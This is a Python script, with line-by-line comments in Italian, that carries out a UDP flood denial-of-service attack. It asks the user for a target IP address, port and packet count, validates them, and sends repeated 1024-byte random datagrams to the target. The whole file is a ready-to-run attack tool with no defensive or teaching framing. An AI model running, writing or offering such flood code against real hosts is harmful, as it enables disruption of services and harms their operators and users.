import socket        # Importa il modulo 'socket' per le operazioni di rete.
import random        # Importa il modulo 'random' per la generazione di numeri casuali.
import ipaddress     # Importa il modulo 'ipaddress' per la gestione degli indirizzi IP.

def udp_flood(target_ip, target_port, num_packets):  # Definisce la funzione 'udp_flood' per eseguire l'attacco UDP flood.
    """
    Esegue un attacco UDP flood verso l'host e la porta di destinazione specificati.

    Args:
        target_ip (str): L'indirizzo IP dell'host di destinazione.
        target_port (int): La porta di destinazione.
        num_packets (int): Il numero di pacchetti UDP da inviare.
    """
    try:            # Inizia il blocco try-except-finally per la gestione delle eccezioni.
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Crea un oggetto socket UDP. AF_INET specifica la famiglia di indirizzi IPv4, SOCK_DGRAM specifica il tipo di socket UDP.
        data = bytearray(random.getrandbits(8) for _ in range(1024))  # Genera un array di byte di 1024 byte con valori casuali. Questo sarà il payload dei pacchetti UDP.
        for _ in range(num_packets):  # Inizia il ciclo for per inviare i pacchetti.
            udp_socket.sendto(data, (target_ip, target_port))  # Invia il pacchetto UDP all'indirizzo IP e alla porta di destinazione.
        print("Attacco UDP flood completato con successo.")  # Stampa un messaggio di successo.
    except Exception as e:  # Gestisce le eccezioni che possono verificarsi durante l'esecuzione dell'attacco.
        print(f"Si è verificato un errore durante l'attacco UDP flood: {e}")  # Stampa un messaggio di errore, includendo le informazioni sull'eccezione.
    finally:        # Il blocco finally viene sempre eseguito, indipendentemente dal verificarsi o meno di un'eccezione.
        if udp_socket:  # Verifica se il socket è stato creato.
            udp_socket.close()  # Chiude il socket per liberare le risorse di sistema.

if __name__ == "__main__":  # Questo blocco di codice viene eseguito solo quando lo script viene eseguito direttamente (non importato come modulo).
    try:            # Inizia il blocco try-except per la gestione delle eccezioni durante l'input dell'utente.
        target_ip = input("Inserisci l'indirizzo IP dell'host di destinazione: ")  # Richiede all'utente di inserire l'IP di destinazione.
        target_port = int(input("Inserisci la porta di destinazione: "))  # Richiede all'utente di inserire la porta di destinazione e la converte in un intero.
        num_packets = int(input("Inserisci il numero di pacchetti UDP da inviare: "))  # Richiede all'utente di inserire il numero di pacchetti e lo converte in un intero.

        # Validazione dell'indirizzo IP
        try:        # Inizia il blocco try-except per la gestione delle eccezioni durante la validazione dell'IP.
            ipaddress.ip_address(target_ip)  # Utilizza la funzione ipaddress.ip_address() per convalidare l'indirizzo IP.
        except ValueError:    # Gestisce l'eccezione ValueError se l'indirizzo IP non è valido.
            print("Errore: Indirizzo IP non valido.")  # Stampa un messaggio di errore.
            exit(1)          # Termina lo script con codice di uscita 1 (indicando un errore).

        # Validazione della porta
        if not (1 <= target_port <= 65535):  # Verifica se la porta è compresa nell'intervallo valido (1-65535).
            print("Errore: La porta deve essere compresa tra 1 e 65535.")  # Stampa un messaggio di errore.
            exit(1)          # Termina lo script con codice di uscita 1.

        # Validazione del numero di pacchetti
        if num_packets <= 0:  # Verifica se il numero di pacchetti è maggiore di zero.
            print("Errore: Il numero di pacchetti deve essere positivo.")  # Stampa un messaggio di errore.
            exit(1)          # Termina lo script con codice di uscita 1.

        udp_flood(target_ip, target_port, num_packets)  # Chiama la funzione udp_flood() per eseguire l'attacco.

    except ValueError:    # Gestisce l'eccezione ValueError se l'utente inserisce un valore non intero per la porta o il numero di pacchetti.
        print("Errore: Assicurati di inserire valori interi validi per la porta e il numero di pacchetti.")  # Stampa un messaggio di errore.